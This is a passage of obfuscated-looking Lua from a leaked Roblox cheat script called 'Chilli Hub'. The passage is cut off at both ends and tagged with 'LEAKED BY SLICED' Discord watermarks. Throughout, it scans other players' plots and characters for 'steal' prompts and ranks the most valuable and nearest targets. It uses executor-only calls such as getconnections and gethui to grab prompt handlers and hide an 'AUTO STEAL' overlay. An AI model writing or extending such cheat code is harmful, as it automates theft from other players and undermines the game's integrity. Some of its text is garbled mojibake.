			chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle = function(arg, arg2)
				if not arg then
					return
				end

				if tonumber(arg2) == nil then
					arg.Label.TextColor3 = Color3.fromRGB(238, 238, 242)
					arg.Outline.Color = Color3.fromRGB(0, 0, 0)
					arg.Outline.Transparency = 0.28  -- LEAKED BY SLICED | discord.gg/pubmethod
					arg.Text.Enabled = false
					arg.Stroke.Enabled = false
					return
				end

				local sliced16 = chilliGithubFastManualDefaultsRu.BrainrotNameTier(arg2)
				arg.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
				arg.Outline.Transparency = 0.08
				arg.Text.Enabled = true
				arg.Stroke.Enabled = true
				arg.Text.Color = sliced16.Text  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.Stroke.Color = sliced16.Stroke
			end

			do
				local slicedn10 = 0.5
				local obj2 = setmetatable({}, { __mode = "k" })

				local function slicedfn25(arg)
					local sliced16 = slicedfn23(arg)
					if not sliced16 then
						return false
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if slicedfn22(sliced16.Name) == "lucky block" then
						return true
					end

					for _, descendant in ipairs(sliced16:GetDescendants()) do
						if descendant:IsA("TextLabel") and slicedfn22(descendant.Name) == "stolen" and descendant.Visible and slicedfn22(descendant.Text) == "fusing" then
							return true
						end
					end

					return false
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				slicedfn7 = function(arg)
					local now = os.clock()
					local sliced16 = obj2[arg]
					if sliced16 and now < sliced16.ExpiresAt then
						return sliced16.Value
					end
					local sliced17 = slicedfn25(arg)

					if sliced16 then
						sliced16.Value = sliced17
						sliced16.ExpiresAt = now + slicedn10  -- LEAKED BY SLICED | discord.gg/pubmethod
					else
						obj2[arg] = { Value = sliced17, ExpiresAt = now + slicedn10 }
					end

					return sliced17
				end
			end

			slicedfn8 = function(arg)
				local slicedn10 = tonumber(arg) or 0
				if slicedn10 >= 1e9 then
					return string.format("%.2fB/s", slicedn10 / 1e9)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				if slicedn10 >= 1000000 then
					return string.format("%.2fM/s", slicedn10 / 1000000)
				end

				if slicedn10 >= 1000 then
					return string.format("%.1fK/s", slicedn10 / 1000)
				end
				return string.format("%d/s", math.floor(slicedn10))
			end

			do  -- LEAKED BY SLICED | discord.gg/pubmethod
				local function slicedfn25(arg)
					if not arg or arg == "" then
						return nil
					end
					local match, sliced16 = arg:gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")

					if match then
						local slicedn10 = tonumber(match) or 0
						local str3 = sliced16:upper()

						if str3 == "K" then
							slicedn10 *= 1000  -- LEAKED BY SLICED | discord.gg/pubmethod
						elseif str3 == "M" then
							slicedn10 *= 1000000
						elseif str3 == "B" then
							slicedn10 *= 1e9
						elseif str3 == "T" then
							slicedn10 *= 1e12
						end

						return slicedn10
					end

					return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				local function slicedfn26(arg, arg2, arg3, arg4)
					local sliced16 = slicedfn24(arg3)
					arg = arg and arg.Position
					if not arg then
						return sliced16
					end
					local sliced17 = arg4 and arg4[arg3]
					local overhead = nil

					if sliced17 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						local sliced18, sliced19, sliced20 = ipairs(arg4[arg3])
						local slicedn10 = 14
						overhead = nil

						for _, sliced21 in sliced18, sliced19, sliced20 do
							local magnitude = (sliced21.Position - arg).Magnitude

							if magnitude < slicedn10 then
								overhead = sliced21.Overhead
								slicedn10 = magnitude
							end
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					local sliced18 = nil

					if arg2 then
						local sliced19, sliced20, sliced21 = ipairs(arg2:GetChildren())
						local slicedn10 = 14
						sliced18 = nil

						for _, sliced22 in sliced19, sliced20, sliced21 do
							if sliced22:IsA("Model") and sliced22.Name == arg3 then
								local rootPart = sliced22:FindFirstChild("RootPart") or sliced22.PrimaryPart or sliced22:FindFirstChildWhichIsA("BasePart")

								if rootPart then  -- LEAKED BY SLICED | discord.gg/pubmethod
									local magnitude = (rootPart.Position - arg).Magnitude

									if magnitude < slicedn10 then
										slicedn10 = magnitude
										sliced18 = sliced22
									end
								end
							end
						end
					end

					local text  -- LEAKED BY SLICED | discord.gg/pubmethod

					if overhead and overhead:FindFirstChild("Mutation") and overhead.Mutation.Visible and overhead.Mutation.Text ~= "" then
						text = overhead.Mutation.Text
					else
						text = nil

						if sliced18 then
							local attribute = sliced18:GetAttribute("Mutation") or sliced18:GetAttribute("__mutation")
							local flag8 = attribute and tostring(attribute) ~= ""
							text = nil

							if flag8 then
								text = tostring(attribute)  -- LEAKED BY SLICED | discord.gg/pubmethod
							end
						end
					end

					local tbl6 = {}
					local tbl7 = {}

					if sliced18 then
						for _, child in ipairs(sliced18:GetChildren()) do
							local match = child.Name:match("^_Trait%.(.+)$")

							if match and not tbl7[match] then
								tbl7[match] = true  -- LEAKED BY SLICED | discord.gg/pubmethod
								table.insert(tbl6, match)
							end
						end

						local attribute = sliced18:GetAttribute("Trait") or sliced18:GetAttribute("Traits")

						if attribute then
							local str3 = tostring(attribute)

							if not tbl7[str3] then
								tbl7[str3] = true
								table.insert(tbl6, str3)
							end  -- LEAKED BY SLICED | discord.gg/pubmethod
						end
					end

					local sliced19 = text and sliced14 and sliced14[text]
					local slicedn10 = 1

					if sliced19 then
						slicedn10 = 1 + (tonumber(sliced14[text].Modifier) or 0)
					end

					local flag8 = false

					if sliced15 then
						for _, sliced20 in ipairs(tbl6) do  -- LEAKED BY SLICED | discord.gg/pubmethod
							local sliced21 = sliced15[sliced20] or sliced15[sliced20:gsub("_", " ")]

							if sliced21 then
								if sliced20 == "Sleepy" or sliced21.Name == "Sleepy" then
									flag8 = true
								else
									slicedn10 += tonumber(sliced21.MultiplierModifier) or 0
								end
							end
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					local sliced20 = math.round(sliced16 * slicedn10 * (flag8 and 0.5 or 1))
					local sliced21 = slicedfn25(overhead and overhead:FindFirstChild("Generation") and overhead.Generation.Text)
					if sliced21 and sliced21 > sliced20 then
						return sliced21
					end
					return sliced20 > 0 and sliced20 or (sliced21 or sliced16)
				end

				slicedfn9 = function(arg)
					local now = os.clock()
					if not arg and now - slicedn7 < slicedn8 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return
					end
					slicedn7 = now
					local tbl6 = {}
					local plots = Workspace:FindFirstChild("Plots")
					if not plots then
						tbl3 = tbl6
						return
					end
					local debris = Workspace:FindFirstChild("Debris")  -- LEAKED BY SLICED | discord.gg/pubmethod
					local tbl7 = {}

					if debris then
						for _, child in ipairs(debris:GetChildren()) do
							if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
								local animalOverhead = child:FindFirstChild("AnimalOverhead")
								local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

								if displayName and displayName:IsA("TextLabel") and displayName.Text ~= "" then
									local text = displayName.Text
									tbl7[text] = tbl7[text] or {}
									table.insert(tbl7[text], { Position = child.Position, Overhead = animalOverhead })  -- LEAKED BY SLICED | discord.gg/pubmethod
								end
							end
						end
					end

					for _, child in ipairs(plots:GetChildren()) do
						local animalPodiums = child:FindFirstChild("AnimalPodiums")

						if animalPodiums then
							for _, child2 in ipairs(animalPodiums:GetChildren()) do
								local base = child2:FindFirstChild("Base")
								base = base and base:FindFirstChild("Spawn")  -- LEAKED BY SLICED | discord.gg/pubmethod

								if base and base:IsA("BasePart") then
									local promptAttachment = base:FindFirstChild("PromptAttachment")
									local ipairs = ipairs
									promptAttachment = promptAttachment or base
									local sliced17 = nil

									for _, descendant in ipairs(promptAttachment:GetDescendants()) do
										if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
											sliced17 = descendant
											break
										else  -- LEAKED BY SLICED | discord.gg/pubmethod
											sliced17 = nil
										end
									end

									if sliced17 then
										local str3 = tostring(sliced17.ObjectText or "")

										tbl6[#tbl6 + 1] = {
											Prompt = sliced17,
											Plot = child,
											Spawn = base,
											Name = str3,  -- LEAKED BY SLICED | discord.gg/pubmethod
											Generation = slicedfn26(base, child, str3, tbl7),
										}
									end
								end
							end
						end
					end

					tbl3 = tbl6
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			local slicedn10 = 0.03
			local slicedn11 = -math.huge
			local sliced16 = nil
			local sliced17 = nil
			local sliced18 = nil
			local sliced19 = nil
			local sliced20 = nil
			local sliced21 = nil
			local slicedfn25

			slicedfn25 = function(arg, arg2, distance, generation)  -- LEAKED BY SLICED | discord.gg/pubmethod
				local tbl6 = { Prompt = arg.Prompt, Plot = arg.Plot, Position = arg2 }
				local name = arg.Name
				local name2

				if name then
					name2 = name
				else
					name2 = tostring(arg.Prompt.ObjectText or "")
				end

				tbl6.Name = name2
				tbl6.Generation = generation  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl6.Distance = distance
				return tbl6
			end

			prompt2 = nil

			slicedfn10 = function(arg)
				if not arg then
					return nil
				end

				for _, sliced22 in ipairs(tbl3) do
					if sliced22.Prompt == arg then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return sliced22
					end
				end

				return nil
			end

			slicedfn11 = function(arg)
				if not (prompt2 and prompt2.Parent and arg) then
					return nil
				end
				local sliced22 = slicedfn10(prompt2)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if not sliced22 then
					return nil
				end
				local position = sliced22.Spawn.Position
				return slicedfn25(sliced22, position, (arg.Position - position).Magnitude, sliced22.Generation or 0)
			end

			slicedfn12 = function(arg, arg2, arg3, arg4)
				if flag4 then
					arg2 = arg4 or arg2
					if arg2 and arg2.Distance <= slicedn3 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return arg2
					end
					return nil
				end

				local sliced22 = slicedfn11(arg)
				if sliced22 then
					return sliced22
				end
				return arg3
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			str2 = "Default (Chilli Hub)"
			slicedfn13 = nil
			slicedfn14 = nil
			screenGui = Instance.new("ScreenGui")
			screenGui.Name = "ChilliMacLibTargetGui"
			screenGui.ResetOnSpawn = false
			screenGui.IgnoreGuiInset = true
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.Enabled = false

			pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				screenGui.Parent = type(gethui) == "function" and gethui() or CoreGui
			end)

			do
				local frame3 = Instance.new("Frame")
				frame3.Name = "TargetCard"
				frame3.AnchorPoint = Vector2.new(0.5, 0)
				frame3.Position = UDim2.new(0.5, 0, 0, 72)
				frame3.Size = UDim2.fromOffset(270, 48)
				frame3.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
				frame3.BackgroundTransparency = 0.15  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame3.BorderSizePixel = 0
				frame3.Parent = screenGui
				Instance.new("UICorner", frame3).CornerRadius = UDim.new(0, 10)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(58, 255, 55)
				uiStroke.Thickness = 1.2
				uiStroke.Transparency = 0.3
				uiStroke.Parent = frame3
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel3.Position = UDim2.fromOffset(12, 5)
				textLabel3.Size = UDim2.new(1, -24, 0, 14)
				textLabel3.Font = Enum.Font.GothamBold
				textLabel3.TextSize = 11
				textLabel3.TextColor3 = Color3.fromRGB(58, 255, 55)
				textLabel3.TextXAlignment = Enum.TextXAlignment.Left
				textLabel3.Text = "AUTO STEAL (MAC LIB) - Má»¤C TIÃU Gáº¦N NHáº¤T"
				textLabel3.Parent = frame3
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.BackgroundTransparency = 1  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel4.Position = UDim2.fromOffset(12, 22)
				textLabel4.Size = UDim2.new(1, -24, 0, 20)
				textLabel4.Font = Enum.Font.GothamBlack
				textLabel4.TextSize = 13
				textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel4.Text = "Äang quÃ©t tÃ¬m brainrot gáº§n nháº¥t..."
				textLabel4.Parent = frame3
				local flag8 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced22 = nil
				local vector2 = Vector2.new(0, 0)
				local position = nil

				slicedfn4(frame3.InputBegan:Connect(function(input)
					local sliced23 = flag8
					local flag9

					if flag8 then
						flag9 = sliced23
					else
						flag9 = input.UserInputState ~= Enum.UserInputState.Begin  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					if flag9 then
						return
					end
					local flag10 = input.UserInputType == Enum.UserInputType.Touch
					if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag10 then
						return
					end
					local vector22 = Vector2.new(input.Position.X, input.Position.Y)
					if not slicedfn21(frame3, vector22) then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return
					end
					flag8 = true
					sliced22 = flag10 and input or nil
					vector2 = vector22
					position = frame3.Position
				end))

				slicedfn4(UserInputService2.InputChanged:Connect(function(input)
					if not flag8 or not position then
						return  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					if sliced22 and input == sliced22 or not sliced22 and input.UserInputType == Enum.UserInputType.MouseMovement then
						local slicedn12 = Vector2.new(input.Position.X, input.Position.Y) - vector2
						frame3.Position = UDim2.new(position.X.Scale, position.X.Offset + slicedn12.X, position.Y.Scale, position.Y.Offset + slicedn12.Y)
					end
				end))

				slicedfn4(UserInputService2.InputEnded:Connect(function(input)
					if not flag8 then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if sliced22 and input == sliced22 or not sliced22 and input.UserInputType == Enum.UserInputType.MouseButton1 then
						flag8 = false
						sliced22 = nil
						position = nil
					end
				end))

				slicedfn15 = function(arg)
					if not screenGui.Parent then
						return
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if not (str2 and string.find(str2, "Mac")) then
						screenGui.Enabled = false
						return
					end
					screenGui.Enabled = true

					if arg and arg.Name then
						local str3 = arg.Distance and string.format("%.1fm", arg.Distance) or ""
						local str4 = arg.Generation and arg.Generation > 0 and " | " .. slicedfn8(arg.Generation) or ""
						textLabel4.Text = string.format("%s (%s)%s", tostring(arg.Name), str3, str4)
					else  -- LEAKED BY SLICED | discord.gg/pubmethod
						textLabel4.Text = "Äang quÃ©t tÃ¬m brainrot gáº§n nháº¥t..."
					end
				end
			end

			slicedfn16 = function(arg)
				slicedfn15(arg)
			end

			do
				local function slicedfn26(arg)
					local match, sliced22 = tostring(arg or ""):match("%$?([%d%.]+)%s*([KMB]?)")  -- LEAKED BY SLICED | discord.gg/pubmethod
					if not match then
						return 0
					end
					local slicedn12 = tonumber(match) or 0

					if sliced22 == "K" then
						slicedn12 *= 1000
					elseif sliced22 == "M" then
						slicedn12 *= 1000000
					elseif sliced22 == "B" then
						slicedn12 *= 1e9  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					return slicedn12
				end

				local function slicedfn27()
					local name = localPlayer.Name
					local displayName = localPlayer.DisplayName
					local plots = Workspace:FindFirstChild("Plots")
					if not plots then
						return nil
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					for _, child in ipairs(plots:GetChildren()) do
						local plotSign = child:FindFirstChild("PlotSign")

						if plotSign then
							local surfaceGui = plotSign:FindFirstChild("SurfaceGui")

							if surfaceGui then
								local frame3 = surfaceGui:FindFirstChild("Frame")

								if frame3 then
									local textLabel3 = frame3:FindFirstChildOfClass("TextLabel")

									if textLabel3 and type(textLabel3.Text) == "string" then
										local text = textLabel3.Text  -- LEAKED BY SLICED | discord.gg/pubmethod
										if string.find(text, displayName, 1, true) or string.find(text, name, 1, true) then
											return child
										end
										continue
									end

									continue
								end
							end
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					return nil
				end

				local function slicedfn28(arg)
					if not (arg and arg:IsA("Model")) then
						return nil
					end

					for _, descendant in ipairs(arg:GetDescendants()) do
						if descendant:IsA("TextLabel") then
							local sliced22 = string.lower(descendant.Name)
							if sliced22 == "generation" or sliced22 == "gen" or sliced22:find("generation") or sliced22:find("gen") then  -- LEAKED BY SLICED | discord.gg/pubmethod
								return descendant
							end
						end
					end

					return nil
				end

				slicedfn17 = function(arg)
					if not arg then
						return nil, nil, 0
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
					local position = arg.Position
					local sliced22 = nil
					local sliced23 = nil
					local slicedn12 = -math.huge
					local huge = math.huge
					local slicedn13 = 0

					local function slicedfn29(arg2, arg3, arg4, arg5)
						if not (arg2 and arg2.Parent) then
							return
						end  -- LEAKED BY SLICED | discord.gg/pubmethod

						if tostring(arg2.ActionText) ~= str then
							return
						end

						if slicedfn7(arg2) then
							return
						end

						if not arg4 then
							arg4 = tostring(arg2.ObjectText or "")
						end

						if type(arg5) ~= "number" then  -- LEAKED BY SLICED | discord.gg/pubmethod
							local flag8 = type(arg5) == "string" and arg5 ~= ""
							local slicedn14 = 0

							if flag8 then
								arg5 = slicedfn26(arg5)
							else
								arg5 = slicedn14
							end
						end

						if arg5 == 0 then
							arg5 = slicedfn24(arg4)  -- LEAKED BY SLICED | discord.gg/pubmethod
						end

						if slicedn2 and slicedn2 > 1000 and arg5 > 0 and arg5 < slicedn2 then
							return
						end
						slicedn13 += 1
						local magnitude = (position - arg3).Magnitude

						if magnitude <= slicedn3 then
							local tbl6 = {
								Prompt = arg2,
								Spawn = { Position = arg3 },  -- LEAKED BY SLICED | discord.gg/pubmethod
								Position = arg3,
								Name = arg4,
								Generation = arg5,
								Distance = magnitude,
							}

							if not sliced22 or arg5 > slicedn12 then
								sliced22 = tbl6
								slicedn12 = arg5
							end

							if not sliced23 or magnitude < huge then  -- LEAKED BY SLICED | discord.gg/pubmethod
								sliced23 = tbl6
								huge = magnitude
							end
						end
					end

					local plots = Workspace:FindFirstChild("Plots")
					local slicedn14 = 0

					if slicedn9 then
						slicedn14 = os.clock() < slicedn9
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if plots and not slicedn14 then
						local sliced24 = slicedfn27()

						for _, child in ipairs(plots:GetChildren()) do
							if child ~= sliced24 then
								local animalPodiums = child:FindFirstChild("AnimalPodiums")

								if animalPodiums then
									for _, child2 in ipairs(animalPodiums:GetChildren()) do
										local base = child2:FindFirstChild("Base")
										local spawn = base and base:FindFirstChild("Spawn")

										if spawn and spawn:IsA("BasePart") then  -- LEAKED BY SLICED | discord.gg/pubmethod
											local promptAttachment = spawn:FindFirstChild("PromptAttachment") or spawn
											local sliced25 = nil

											for _, descendant in ipairs(promptAttachment:GetDescendants()) do
												if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
													sliced25 = descendant
													break
												else
													sliced25 = nil
												end
											end  -- LEAKED BY SLICED | discord.gg/pubmethod

											if sliced25 then
												local str3 = tostring(sliced25.ObjectText or "")
												local attachment = spawn:FindFirstChild("Attachment")
												attachment = attachment and attachment:FindFirstChild("AnimalOverhead")
												local str4 = ""

												if attachment then
													local generation = attachment:FindFirstChild("Generation")

													if generation and generation:IsA("TextLabel") then
														str4 = generation.Text
													end  -- LEAKED BY SLICED | discord.gg/pubmethod
												end

												if str4 == "" and str3 ~= "" then
													local sliced26 = child:FindFirstChild(str3) or child:FindFirstChild(str3, true)

													if sliced26 and sliced26:IsA("Model") then
														local sliced27 = slicedfn28(sliced26)

														if sliced27 then
															str4 = sliced27.Text
														end
													end
												end  -- LEAKED BY SLICED | discord.gg/pubmethod

												slicedfn29(sliced25, spawn.Position, str3, str4, child.Name, tostring(i))
											end
										end
									end
								end
							end
						end
					end

					local debris = Workspace:FindFirstChild("Debris")

					if debris then  -- LEAKED BY SLICED | discord.gg/pubmethod
						for _, child in ipairs(debris:GetChildren()) do
							local sliced24 = string.lower(child.Name or "")

							if sliced24 ~= "lucky block" and sliced24 ~= "camera" and not child:IsA("Camera") then
								local sliced25 = nil

								for _, descendant in ipairs(child:GetDescendants()) do
									if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
										sliced25 = descendant
										break
									else
										sliced25 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
									end
								end

								if sliced25 then
									local position2 = child:IsA("BasePart") and child.Position or (child:IsA("Model") and child.PrimaryPart and child.PrimaryPart.Position or sliced25.Parent and sliced25.Parent:IsA("BasePart") and sliced25.Parent.Position)

									if position2 then
										local str3 = ""

										if child:IsA("Model") then
											local sliced26 = slicedfn28(child)

											if sliced26 then
												str3 = sliced26.Text  -- LEAKED BY SLICED | discord.gg/pubmethod
											end
										end

										slicedfn29(sliced25, position2, tostring(sliced25.ObjectText or child.Name), str3, nil, nil)
									end
								end
							end
						end
					end

					for _, player in ipairs(Players:GetPlayers()) do
						if player.Character then  -- LEAKED BY SLICED | discord.gg/pubmethod
							local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart then
								for _, descendant in ipairs(player.Character:GetDescendants()) do
									if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == str then
										slicedfn29(descendant, humanoidRootPart.Position, tostring(descendant.ObjectText or "Carried Brainrot"), "", nil, nil)
									end
								end
							end
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					return sliced22, sliced23, slicedn13
				end
			end

			slicedfn18 = function(arg)
				if not arg then
					return nil, nil, nil, nil, 0
				end
				local now = os.clock()
				local position = arg.Position
				if now - slicedn11 < slicedn10 and sliced16 and (position - sliced16).Magnitude < 0.5 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return sliced17, sliced18, sliced19, sliced20, sliced21
				end
				slicedfn9(false)
				local slicedn12 = 0
				local sliced22 = nil
				local sliced23 = nil
				local sliced24 = nil
				local sliced25 = nil
				local sliced26 = nil
				local sliced27 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced28 = nil
				local sliced29 = nil

				for _, sliced30 in ipairs(tbl3) do
					local prompt3 = sliced30.Prompt

					if prompt3.Parent and prompt3.Enabled and tostring(prompt3.ActionText) == str and not slicedfn7(prompt3) then
						local generation = sliced30.Generation or 0
						local sliced31 = flag4
						local flag8

						if flag4 then
							flag8 = sliced31  -- LEAKED BY SLICED | discord.gg/pubmethod
						else
							flag8 = generation >= slicedn2
						end

						if flag8 then
							slicedn12 += 1
							local position2 = sliced30.Spawn.Position
							local magnitude = (position - position2).Magnitude

							if not sliced22 or generation > sliced23 then
								sliced22 = slicedfn25(sliced30, position2, magnitude, generation)
								sliced23 = generation  -- LEAKED BY SLICED | discord.gg/pubmethod
							end

							if not sliced24 or magnitude < sliced25 then
								sliced24 = slicedfn25(sliced30, position2, magnitude, generation)
								sliced25 = magnitude
							end

							if magnitude <= slicedn3 then
								if not sliced26 or generation > sliced27 then
									sliced26 = slicedfn25(sliced30, position2, magnitude, generation)
									sliced27 = generation
								end  -- LEAKED BY SLICED | discord.gg/pubmethod

								if not sliced28 or magnitude < sliced29 then
									sliced28 = slicedfn25(sliced30, position2, magnitude, generation)
									sliced29 = magnitude
								end
							end
						end
					end
				end

				slicedn11 = now
				sliced16 = position  -- LEAKED BY SLICED | discord.gg/pubmethod
				sliced17 = sliced26
				sliced18 = sliced28
				sliced19 = sliced22
				sliced20 = sliced24
				sliced21 = slicedn12
				return sliced26, sliced28, sliced22, sliced24, slicedn12
			end

			slicedfn19 = function(arg)
				if not arg or not arg:IsA("ProximityPrompt") or not arg.Parent or type(getconnections) ~= "function" then
					return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				local tbl6 = {}
				local tbl7 = {}

				if not pcall(function()
					for _, sliced22 in pairs(getconnections(arg.PromptButtonHoldBegan)) do
						if sliced22 and sliced22.Function then
							tbl6[#tbl6 + 1] = sliced22.Function
						end
					end

					for _, sliced22 in pairs(getconnections(arg.Triggered)) do  -- LEAKED BY SLICED | discord.gg/pubmethod
						if sliced22 and sliced22.Function then
							tbl7[#tbl7 + 1] = sliced22.Function
						end
					end
				end) or #tbl7 == 0 then
					return nil
				end

				return tbl6, tbl7
			end

			do  -- LEAKED BY SLICED | discord.gg/pubmethod
				local sliced22 = CoreGui

				pcall(function()
					if type(gethui) == "function" then
						local hui = gethui()

						if typeof(hui) == "Instance" then
							sliced22 = hui
						end
					end
				end)

				local chilliAutoGetBarGui = sliced22:FindFirstChild("ChilliAutoGetBarGui")  -- LEAKED BY SLICED | discord.gg/pubmethod

				if chilliAutoGetBarGui then
					pcall(function()
						chilliAutoGetBarGui:Destroy()
					end)
				end

				screenGui2 = Instance.new("ScreenGui")
				screenGui2.Name = "ChilliAutoGetBarGui"
				screenGui2.ResetOnSpawn = false
				screenGui2.IgnoreGuiInset = true
				screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  -- LEAKED BY SLICED | discord.gg/pubmethod
				screenGui2.Enabled = false
				screenGui2.Parent = sliced22
			end

			local color = Color3.fromRGB(58, 255, 55)
			local color2 = Color3.fromRGB(20, 109, 0)
			local createUIGradient

			do
				local gothamBold = Enum.Font.GothamBold

				pcall(function()
					gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)

				local function slicedfn26(arg)
					if typeof(gothamBold) == "Font" then
						arg.FontFace = gothamBold
					else
						arg.Font = Enum.Font.GothamBold
					end
				end

				createUIGradient = function(parent, arg, arg2)
					local uiGradient = Instance.new("UIGradient")  -- LEAKED BY SLICED | discord.gg/pubmethod
					local new = ColorSequenceKeypoint.new
					uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, arg), new(1, arg2) })
					uiGradient.Rotation = 90
					uiGradient.Parent = parent
					return uiGradient
				end

				frame = Instance.new("Frame")
				frame.Name = "Holder"
				frame.AnchorPoint = Vector2.new(0.5, 0)
				frame.Position = UDim2.new(0.5, 0, 0, 10)  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame.Size = UDim2.fromOffset(248, 46)
				frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
				frame.BackgroundTransparency = 0.28
				frame.BorderSizePixel = 0
				frame.Parent = screenGui2
				Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1
				uiStroke.Transparency = 0.93  -- LEAKED BY SLICED | discord.gg/pubmethod
				uiStroke.Parent = frame
				local slicedn12 = 0.125
				local slicedn13 = 248
				local slicedn14 = 1
				local uiScale = Instance.new("UIScale")
				uiScale.Parent = frame

				local function slicedfn27()
					local currentCamera = Workspace.CurrentCamera
					local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

					if viewportSize.X < 1 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						viewportSize = Vector2.new(1280, 720)
					end

					uiScale.Scale = math.clamp(viewportSize.X * slicedn12 * slicedn14 / slicedn13, 0.6, 1.4)
				end

				slicedfn27()
				local currentCamera = Workspace.CurrentCamera

				if currentCamera then
					slicedfn4(currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(slicedfn27))
				end

				slicedfn4(Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(slicedfn27))  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel = Instance.new("TextLabel")
				textLabel.BackgroundTransparency = 1
				textLabel.Position = UDim2.fromOffset(14, 8)
				textLabel.Size = UDim2.new(1, -104, 0, 15)
				textLabel.TextSize = 13
				textLabel.TextScaled = true
				textLabel.TextXAlignment = Enum.TextXAlignment.Left
				textLabel.TextTruncate = Enum.TextTruncate.None
				textLabel.TextColor3 = Color3.fromRGB(238, 238, 242)
				textLabel.Text = ""  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn26(textLabel)
				textLabel.Parent = frame
				local uiTextSizeConstraint = Instance.new("UITextSizeConstraint")
				uiTextSizeConstraint.MinTextSize = 8
				uiTextSizeConstraint.MaxTextSize = 13
				uiTextSizeConstraint.Parent = textLabel
				chilliGithubFastManualDefaultsRu.AutoStealBarNameStyle = chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle(textLabel)
				textLabel2 = Instance.new("TextLabel")
				textLabel2.BackgroundTransparency = 1
				textLabel2.AnchorPoint = Vector2.new(1, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
				textLabel2.Position = UDim2.new(1, -14, 0, 8)
				textLabel2.Size = UDim2.fromOffset(88, 15)
				textLabel2.TextSize = 13
				textLabel2.TextXAlignment = Enum.TextXAlignment.Right
				textLabel2.TextColor3 = color
				textLabel2.Text = ""
				slicedfn26(textLabel2)
			end

			textLabel2.Parent = frame
			local frame3 = Instance.new("Frame")  -- LEAKED BY SLICED | discord.gg/pubmethod
			frame3.Position = UDim2.fromOffset(14, 30)
			frame3.Size = UDim2.new(1, -28, 0, 6)
			frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame3.BackgroundTransparency = 0.88
			frame3.BorderSizePixel = 0
			frame3.Parent = frame
			Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
			frame2 = Instance.new("Frame")
			frame2.Size = UDim2.new(0, 0, 1, 0)
			frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  -- LEAKED BY SLICED | discord.gg/pubmethod
			frame2.BorderSizePixel = 0
			frame2.Parent = frame3
			Instance.new("UICorner", frame2).CornerRadius = UDim.new(1, 0)
			createUIGradient(frame2, color, color2)
		end

		local frame3, visible, flag8, slicedn8, slicedn9, slicedn10, slicedn11, slicedfn20, slicedfn21, sliced13
